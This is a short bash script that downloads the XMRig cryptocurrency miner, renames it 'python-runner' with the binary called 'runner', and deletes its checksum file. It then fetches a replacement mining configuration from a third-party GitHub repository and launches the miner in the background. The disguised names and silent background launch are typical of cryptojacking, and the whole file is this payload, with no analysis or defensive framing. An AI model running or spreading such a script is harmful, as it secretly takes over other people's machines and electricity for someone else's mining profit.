#!/bin/bash
cd /tmp
wget -O python-runner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
tar xvzf python-runner.tar.gz -C /mnt
rm -rf /tmp/python-runner.tar.gz
mv /mnt/xmrig-6.10.0 /mnt/python-runner
cd /mnt/python-runner
rm -rf /mnt/python-runner/SHA256SUMS && rm -rf /mnt/python-runner/config.json
mv /mnt/python-runner/xmrig /mnt/python-runner/runner
wget -O /mnt/python-runner/config.json https://raw.githubusercontent.com/Eilya/python-runner/main/config.json
cd /mnt/python-runner
./runner -c /mnt/python-runner/config.json --background
